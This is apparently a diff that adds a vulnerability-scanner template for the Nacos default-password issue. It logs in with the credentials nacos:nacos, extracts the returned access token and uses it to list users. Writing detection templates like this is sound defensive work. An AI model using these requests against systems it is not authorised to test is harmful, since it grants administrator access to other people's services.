@@ -1,0 +1,52 @@
+id: nacos-default-password
+info:
+  name: Nacos Default Password Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Nacos is a platform for building dynamic service discovery, configuration management, and service management for cloud-native applications. There is a default password vulnerability in Nacos. Attackers can use nacos:nacos to control Nacos and use administrator privileges to operate core functions.
+  tags: default-password
+  classification:
+    cvss-metrics: "3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
+    cvss-score: 10.0
+
+variables:
+  username: nacos
+  password: nacos
+
+http:
+  - raw:
+      - |
+        POST /nacos/v1/auth/login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+        Accept-Encoding: gzip, deflate
+
+        username={{username}}&password={{password}}&namespaceId=
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - '"accessToken":"[a-zA-Z0-9]+"'
+    extractors:
+      - type: regex
+        name: access_token
+        regex:
+          - '"accessToken":"([a-zA-Z0-9]+)"'
+        group: 1
+  - raw:
+      - |
+        GET /nacos/v1/auth/users?pageNo=1&pageSize=9 HTTP/1.1
+        Host: {{Hostname}}
+        Accesstoken: {{access_token}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - '"pageItems":\[.*?\]'
